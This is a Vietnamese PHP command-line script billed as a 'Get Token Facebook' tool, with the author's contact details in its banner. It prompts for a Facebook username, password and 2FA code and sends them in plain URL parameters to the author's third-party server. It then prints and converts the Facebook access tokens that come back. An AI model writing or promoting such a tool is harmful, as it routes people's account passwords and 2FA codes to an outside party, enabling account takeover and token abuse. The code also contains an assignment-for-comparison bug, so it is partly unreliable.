<?php
// author : Lê Anh Trường
error_reporting(0);
#Colors
$ress = "\033[0;32m";
$res = "\033[0;33m";
$red = "\033[0;31m";
$green = "\033[0;37m";
$nau = "\e[38;5;94m";
$white = "\033[0;33m";
$banner = "\r";
$xnhac = "\033[1;96m";
$den = "\033[1;90m";
$do = "\033[1;91m";
$luc = "\033[1;92m";
$vang = "\033[1;93m";
$xduong = "\033[1;94m";
$hong = "\033[1;95m";
$trang = "\033[1;97m";
$y2 = "\033[0;33m";
$white = "\033[0;37m";
$cyan = "\e[1;36m";
$blue = "\e[1;34m";
$ngreen = "\033[42m";
$ngreen = "\033[42m";
$maul = rand(31, 37);
$maui = "\033[1;".$maul."m";
system('clear');
$banner = "\r
\033[0;32m

░██████╗░███████╗████████╗
██╔════╝░██╔════╝╚══██╔══╝
██║░░██╗░█████╗░░░░░██║░░░
██║░░╚██╗██╔══╝░░░░░██║░░░
╚██████╔╝███████╗░░░██║░░░
░╚═════╝░╚══════╝░░░╚═╝░░░

████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗
╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║
░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║
░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║
░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║
░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝

███████╗██████╗░
██╔════╝██╔══██╗
█████╗░░██████╦╝
██╔══╝░░██╔══██╗
██║░░░░░██████╦╝
╚═╝░░░░░╚═════╝░\n";
echo $banner;
echo"
$vang •╔═════════════════════════☩══♛══☩═════════════════════════╗•
$luc        ☞ Copyright : Lê Anh Trường
$luc        ☞ Zalo: 0338619528
$luc        ☞ Facebook: https://www.facebook.com/lleanhtruong
$vang •╚═════════════════════════☩══✦══☩═════════════════════════╝•\n";
echo "$xduong Tool Get Token Facebook\n";
while (true) {
    echo "$vang  Nhập Username \e[1;35m❯\e[1;36m❯\e[1;31m❯ $luc";
    $username = trim(fgets(STDIN));
    echo "$vang  Nhập Password \e[1;35m❯\e[1;36m❯\e[1;31m❯ $luc";
    $password = trim(fgets(STDIN));
    if (!$username || !$password) {
        echo "$ress Dữ Liệu Bị Thiếu . Vui Lòng Nhập Lại\n";
    } else {
        break;
    }
}
echo "$vang  Bạn Có Muốn Nhập Mã 2Fa Facebook (yes/no): \e[1;35m❯\e[1;36m❯\e[1;31m❯ $luc";
$type = trim(fgets(STDIN));
if ($type == 'yes') {
    while (true) {
        echo "$vang  Nhập Mã 2Fa 12 chữ số : \e[1;35m❯\e[1;36m❯\e[1;31m❯ $luc";
        $auth = trim(fgets(STDIN));
        if (!$auth) {
            echo "$ress Dữ Liệu Bị Thiếu . Vui Lòng Nhập Lại\n";
        } else {
            break;
        }
    }
} else {}
echo "$vang  Tiến Hành Get Token\n";
$u = json_decode(file_get_contents('https://leanhtruong.edu.vn/api/Facebook_Token?type=GetTokenApp&username='.$username.'&password='.$password.'&auth='.$auth), TRUE);
echo "$vang  Data: \e[1;35m❯\e[1;36m❯\e[1;31m❯ $luc ".$u['message']."\n";
if (strpos($u['message'], 'EAAV') !== false) {
    while (true) {
        echo "$vang  Bạn Có Muốn Lấy Token Loại Khác (yes/no) : \e[1;35m❯\e[1;36m❯\e[1;31m❯ $luc";
        $token = trim(fgets(STDIN));
        if ($token = 'yes') {
            echo "$cyan [$luc 1 $vang] => $luc EAAD6V7\n";
            echo "$cyan [$luc 2 $vang] => $luc EAAAAU\n";
            echo "$cyan [$luc 3 $vang] => $luc EAAD\n";
            echo "$cyan [$luc 4 $vang] => $luc EAAC\n";
            $ar = array(
                '1' => 'EAAD6V7',
                '2' => 'EAAAAU',
                '3' => 'EAAD',
                '4' => 'EAAC',
            );
            while (true) {
                echo "$vang  Nhập Loại Token Muốn Lấy : \e[1;35m❯\e[1;36m❯\e[1;31m❯ $luc";
                $tokenn = trim(fgets(STDIN));
                if (!$ar[$tokenn]) {
                    echo "$vang  Nhập Loại Token Muốn Lấy : \e[1;35m❯\e[1;36m❯\e[1;31m❯ $luc";
                    $tokenn = trim(fgets(STDIN));
                } else {
                    break;
                }
            }
            $av = json_decode(file_get_contents('https://leanhtruong.edu.vn/api/Facebook_Token?type=TOKEN_EXCHANGE&access_token='.$u['message'].'&convert='.$ar[$tokenn]), TRUE);
            echo "$vang  Data: \e[1;35m❯\e[1;36m❯\e[1;31m❯ $luc ".$av['message']."\n";
            echo "$vang  Bạn Có Muốn Lấy Token Loại Khác Nữa Không(yes/no) : \e[1;35m❯\e[1;36m❯\e[1;31m❯ $luc";
            $tokennn = trim(fgets(STDIN));
            if ($tokennn == 'yes') {} else {
                break;
            }

        }
    }
}
